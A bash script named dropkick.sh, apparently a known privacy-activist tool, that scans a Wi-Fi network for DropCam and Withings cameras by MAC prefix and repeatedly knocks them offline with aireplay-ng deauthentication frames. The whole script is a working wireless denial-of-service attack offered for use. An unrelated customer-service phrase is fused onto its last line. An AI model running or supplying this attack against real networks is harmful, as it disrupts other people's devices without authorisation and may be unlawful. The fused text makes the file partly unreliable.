#!/bin/bash
out () { printf %s\\n "$*" ; }

# dropkick.sh
#
# Detect and disconnect DropCam and Withings devices.
#
# Syntax:
#
#   sudo dropkick.sh <WIRELESS NIC> <BSSID OF ACCESS POINT>
#
# Credit:
#
#   https://julianoliver.com/output/log_2015-12-18_14-39
#
# Based on Glasshole.sh:
#
#   http://julianoliver.com/output/log_2014-05-30_20-52
#
# This script was named by Adam Harvey (http://ahprojects.com), who also
# encouraged me to write it. It requires a GNU/Linux host (laptop, Raspberry Pi,
# etc) and the aircrack-ng suite.
#
# See also http://plugunplug.net, for a plug-and-play device that does this
# based on OpenWrt. Code here:
#
#   https://github.com/JulianOliver/CyborgUnplug
#

shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

readonly NIC=$1 # Your wireless NIC
readonly BSSID=$2 # Network BSSID (AirBnB WiFi network)
readonly MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
# MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # If 'ifconfig' not
# present.
readonly GGMAC='@(30:8C:FB*|00:24:E4*)' # Match against DropCam and Withings
readonly POLL=30 # Check every 30 seconds
readonly LOG=/var/log/dropkick.log

airmon-ng stop mon0 # Pull down any lingering monitor devices
airmon-ng start $NIC # Start a monitor device

while true;
    do
        for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
           do
               if [[ "$TARGET" == "$GGMAC" ]]
                   then
                       out "WiFi camera discovered: "$TARGET >> $LOG
                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0
                       out "De-authed: "$TARGET " from network: " $BSSID >> $LOG
                    else
                        out $TARGET": is not a DropCam or Withings device. Leaving alone.."
               fi
           done
           out "None found this round."
           sleep $POLL
done
airmon-ng stop mon0Can you please let me know how we can help
